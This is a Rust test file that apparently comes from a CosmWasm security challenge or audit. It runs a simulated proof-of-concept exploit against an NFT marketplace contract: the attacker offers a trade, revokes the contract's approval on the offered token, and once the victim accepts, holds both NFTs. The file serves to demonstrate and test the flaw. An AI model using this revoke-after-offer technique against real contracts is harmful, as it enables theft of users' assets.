#[cfg(test)]
mod tests{
    use cosmwasm_std::{Addr, Empty, Uint128};
    use cw721::{OwnerOfResponse, Cw721QueryMsg};
    use cw_multi_test::Executor;

    use crate::{integration_tests::tests::{proper_instantiate, USER1, NFT1, ADMIN}, msg::ExecuteMsg};
    pub const ATTACKER: &str = "attacker";
    pub const NFT_1337: &str = "leet-nft";
    #[test]
    fn exploit(){
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Attacker is an NFT holder
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_1337.to_string(),
                owner: ATTACKER.to_string(),
                token_uri: Some("https://www.informal.systems".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        // Attacker gives approval to contract
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();


        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();


        // Create trade offer
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();


        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();
        


        // Accept trade
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: ATTACKER.to_string(),
            },
            &[],
        )
        .unwrap();

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, ATTACKER.to_string());
        
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_1337.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, ATTACKER.to_string());

    }
   
}